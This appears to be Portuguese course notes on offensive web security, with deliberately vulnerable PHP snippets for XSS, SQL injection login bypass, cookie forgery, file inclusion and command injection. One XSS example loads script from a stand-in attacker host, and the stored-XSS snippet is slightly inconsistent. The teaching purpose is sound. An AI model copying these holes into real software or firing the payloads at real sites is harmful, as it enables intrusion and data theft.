# Segurança ofensiva

### Introdução
- Blackhats x Whitehats
- Mercado de segurança da informação

### [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
- Refletido:
```php
# http://localhost/xss.php?mensagem=<script>alert('XSS');</script>
# http://localhost/xss.php?mensagem=<marquee><h1>XSS</h1></marquee>
# http://localhost/xss.php?mensagem=<script src=http://atacante.segphp4linux.com.br/domal.js></script>

echo isset($_GET['mensagem']) ? $_GET['mensagem'] : '';
```

- Residente:
```php
# http://localhost/xss_residente.php?mensagem=<script>alert('XSS');</script>

session_start();

if (isset($_GET['variavel'])) {
    $_SESSION['variavel'] = $_GET['variavel'];
}

echo isset($_SESSION['variavel']) ? $_GET['variavel'] : "" ;
```

- XSHM - Cross-Site History Manipulation
```php
/*
http://vitima.segphp4linux/xss_xshm.php?mensagem=<script>alert(history.length);</script>
*/

echo isset($_GET['mensagem']) ? $_GET['mensagem'] : '';
```

- [CSRF - Cross-Site Request Forgery](https://pt.wikipedia.org/wiki/Cross-site_request_forgery)

- [Click Jacking](http://sectheory.com/clickjacking.htm) - [exemplo](http://koto.github.io/blog-kotowicz-net-examples/cursorjacking/)

### [SQL Injection](https://www.acunetix.com/websitesecurity/sql-injection2/)
- [Comum](scripts/sqli/sqlinjection.php)
```php
# login=' or '1'='1
# senha=' or '1'='1

if ($_POST) {
    $query = "SELECT * FROM usuarios WHERE user='$user' AND pass='$pass' ";

    echo $query;
}
```
- Union inband
- Batched
- Blind
- Error Based

### [LDAP Injection](https://www.owasp.org/index.php/LDAP_Injection_Prevention_Cheat_Sheet)

### [Insecure Cookie Handling](http://kb.enprobe.io/vulnerabilities/insecure-cookies.html)
-- Exemplo
```php
if ($_GET['login'] == 'naousehardcode' && $_GET['senha'] == 'naousehardcode') {
    setcookie('autenticado', 1);
}

if (!$_COOKIE['autenticado'] == 1) {
    die('Usuario nao autenticado!');
}
```

- [RFI/LFI - Remote/Local File Inclusion](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
-- Exemplo
```php
require($_GET['modulo']);
```

- [Command Injection](https://www.owasp.org/index.php/Command_Injection)
-- Exemplo
```php
system($_GET['comando']);
```

- [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)

- [Web Crawlers](https://pt.wikipedia.org/wiki/Rastreador_web)
-- Exemplo
```php
# Exemplo: https://stackoverflow.com/a/2313146

function crawl_page($url, $depth = 5) {
    if($depth > 0) {
        $html = file_get_contents($url);

        preg_match_all('~<a.*?href="(.*?)".*?>~', $html, $matches);

        foreach($matches[1] as $newurl) {
            crawl_page($newurl, $depth - 1);
        }

        file_put_contents('results.txt', $newurl."\n\n".$html."\n\n", FILE_APPEND);
    }
}

crawl_page('http://www.domain.com/index.php', 5);
```

- [Session fixation/hijacking](https://www.owasp.org/index.php/Session_fixation)

### [Brute force](https://pt.wikipedia.org/wiki/Ataque_de_for%C3%A7a_bruta)

### [Man In The Middle](https://www.owasp.org/index.php/Man-in-the-middle_attack)

### [DDOS](https://pt.wikipedia.org/wiki/Ataque_de_nega%C3%A7%C3%A3o_de_servi%C3%A7o)

### Algumas Ferramentas
- [Kali Linux](https://www.kali.org/)
- [Metasploint](https://www.metasploit.com/)
- [nmap](https://nmap.org/)
- [tcpdump](https://www.tcpdump.org/tcpdump_man.html)
- [Wireshark](https://www.wireshark.org/)
- [Ettercap](http://www.ettercap-project.org/ettercap/)
- [SQLMap](http://sqlmap.org/)
- [PHP Crawler](http://phpcrawl.cuab.de/)
- [John the Ripper](http://www.openwall.com/john/)
